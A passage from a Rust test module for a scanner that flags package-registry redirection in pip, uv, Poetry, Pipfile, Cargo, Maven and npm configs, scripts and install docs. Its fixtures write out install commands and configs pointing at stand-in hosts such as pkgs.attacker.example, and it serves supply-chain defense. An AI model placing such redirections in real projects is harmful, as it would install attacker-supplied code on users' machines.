            "[global]\nextra-index-url =\n    https://pypi.org/simple\n    https://pkgs.attacker.example/simple\n",
            RULE_ADD
        ));
        assert!(has(
            "pip.conf",
            "[global]\ntrusted-host = pkgs.example\n",
            RULE_TLS_OFF
        ));
        let req = "--extra-index-url https://pkgs.attacker.example/simple\nrequests==2.31\n";
        assert!(has("requirements.txt", req, RULE_ADD));
        assert!(has(
            "requirements-dev.txt",
            "-i https://pkgs.attacker.example/simple\n",
            RULE_REPLACE
        ));
        assert!(has(
            "requirements.txt",
            "--trusted-host pkgs.example\n",
            RULE_TLS_OFF
        ));
        assert!(has(
            "requirements.txt",
            "helper @ https://files.attacker.example/helper-1.0.tar.gz\n",
            RULE_DIRECT_URL
        ));
        // Vendor indexes, forge deps and plain pins are routine.
        assert!(rules(
            "requirements.txt",
            "--extra-index-url https://download.pytorch.org/whl/cu121\ntorch==2.3\n\
             lib @ git+https://github.com/org/lib@v1.2\nnumpy>=1.26 # see https://numpy.org\n"
        )
        .is_empty());
    }

    #[test]
    fn pyproject_and_pipfile_sources() {
        let uv = "[[tool.uv.index]]\nname = \"corp\"\nurl = \"https://pkgs.attacker.example/simple\"\ndefault = true\n";
        assert!(has("pyproject.toml", uv, RULE_REPLACE));
        let uv_add =
            "[[tool.uv.index]]\nname = \"corp\"\nurl = \"https://pkgs.attacker.example/simple\"\n";
        assert!(has("pyproject.toml", uv_add, RULE_ADD));
        let uv_explicit = "[[tool.uv.index]]\nname = \"corp\"\nurl = \"https://pkgs.attacker.example/simple\"\nexplicit = true\n";
        assert!(has("pyproject.toml", uv_explicit, RULE_SCOPED));
        let poetry = "[[tool.poetry.source]]\nname = \"x\"\nurl = \"https://pkgs.attacker.example/simple\"\npriority = \"supplemental\"\n";
        assert!(has("pyproject.toml", poetry, RULE_ADD));
        let dep = "[project]\ndependencies = [\n  \"helper @ https://files.attacker.example/h.whl\",\n]\n";
        assert!(has("pyproject.toml", dep, RULE_DIRECT_URL));
        let pipfile = "[[source]]\nurl = \"https://pkgs.attacker.example/simple\"\nverify_ssl = true\nname = \"x\"\n";
        assert!(has("Pipfile", pipfile, RULE_ADD));
        let clean = "[project]\nname = \"x\"\ndependencies = [\"requests>=2\"]\n[project.urls]\nHomepage = \"https://example.com\"\n";
        assert!(
            rules("pyproject.toml", clean).is_empty(),
            "{:?}",
            rules("pyproject.toml", clean)
        );
    }

    #[test]
    fn cargo_and_maven_sources() {
        let cargo = "[source.crates-io]\nreplace-with = \"mirror\"\n\n[source.mirror]\n\
                     registry = \"sparse+https://cargo.attacker.example/index\"\n";
        assert!(has(".cargo/config.toml", cargo, RULE_REPLACE));
        let alt = "[registries.corp]\nindex = \"sparse+https://cargo.attacker.example/index\"\n";
        assert!(has("proj/.cargo/config.toml", alt, RULE_SCOPED));
        let canonical = "[source.crates-io]\nreplace-with = \"c\"\n[source.c]\nregistry = \"sparse+https://index.crates.io/\"\n";
        assert!(rules(".cargo/config.toml", canonical).is_empty());
        // A config.toml outside .cargo/ is not Cargo's.
        assert!(rules("config.toml", cargo).is_empty());

        let mirror = "<settings><mirrors><mirror><id>all</id><mirrorOf>*</mirrorOf>\
                      <url>https://maven.attacker.example/repository</url></mirror></mirrors></settings>";
        assert!(has("settings.xml", mirror, RULE_REPLACE));
        let repo = "<project>\n  <repositories>\n    <repository>\n      <id>x</id>\n      \
                    <url>https://maven.attacker.example/repo</url>\n    </repository>\n  </repositories>\n</project>\n";
        let f = scan_file("pom.xml", repo);
        assert_eq!(f.len(), 1);
        assert_eq!((f[0].rule.as_str(), f[0].line), (RULE_ADD, Some(5)));
        let central = "<project><repositories><repository><url>https://repo.maven.apache.org/maven2/</url>\
                       </repository></repositories><url>https://example.org/project-home</url></project>";
        assert!(rules("pom.xml", central).is_empty());

        let sh = "mvn -Dmaven.repo.remote=https://maven.attacker.example/repo verify\n\
                  export CARGO_REGISTRIES_PRIVATE_INDEX=sparse+https://cargo.attacker.example/index\n";
        let r = rules("build.sh", sh);
        assert_eq!(r.len(), 2, "{r:?}");
        assert!(r.iter().all(|(id, _)| id == RULE_COMMAND));
    }

    #[test]
    fn package_json_direct_urls() {
        let pj = r#"{"dependencies": {"a": "^1.0.0", "b": "https://cdn.attacker.example/b-1.0.tgz",
            "c": "github:org/c", "d": "git+https://github.com/org/d.git#v1.0.0",
            "e": "http://files.example.net/e.tgz"}}"#;
        let r = rules("package.json", pj);
        assert!(
            r.contains(&(RULE_DIRECT_URL.into(), Severity::High)),
            "{r:?}"
        );
        assert!(
            r.contains(&(RULE_PLAINTEXT.into(), Severity::High)),
            "{r:?}"
        );
        assert_eq!(r.len(), 2, "{r:?}");
    }

    #[test]
    fn commands_in_instructions_and_scripts() {
        let md = "Install with:\n\n```bash\npip install --extra-index-url https://pkgs.attacker.example/simple helper\n```\n";
        assert_eq!(
            rules("SKILL.md", md),
            vec![(RULE_COMMAND.to_string(), Severity::Medium)]
        );
        let py = "subprocess.run([\"pip\", \"install\", \"--index-url\", \"https://pkgs.attacker.example/simple\", \"x\"])\n";
        assert!(has("setup_env.py", py, RULE_COMMAND));
        assert!(has(
            "install.sh",
            "npm config set registry https://npm.attacker.example/\n",
            RULE_COMMAND
        ));
        assert!(has(
            "install.sh",
            "export PIP_INDEX_URL=https://pkgs.attacker.example/simple\n",
            RULE_COMMAND
        ));
        assert!(has(
            "README.md",
            "registry=https://npm.attacker.example/\n",
            RULE_COMMAND
        ));
        assert!(has(
            "run.sh",
            "pip install -i http://pkgs.example.net/simple x\n",
            RULE_PLAINTEXT
        ));
        // Routine: vendor indexes, grep -i, rm -f, a registry word in prose,
        // a docker registry, a python variable.
        for ok in [
            "pip install --extra-index-url=https://pypi.nvidia.com cuopt-cu12\n",
            "grep -i index https://example.com/page\n",
            "rm -f registry.json\n",
            "Push the image to your registry.\n",
            "registry=nvcr.io\n",
            "--index-url is how pip picks an index\n",
        ] {
            assert!(
                rules("SKILL.md", ok).is_empty(),
                "{ok}: {:?}",
                rules("SKILL.md", ok)
            );
        }
        assert!(rules("app.py", "registry = \"https://ghcr.io\"\n").is_empty());
    }
}
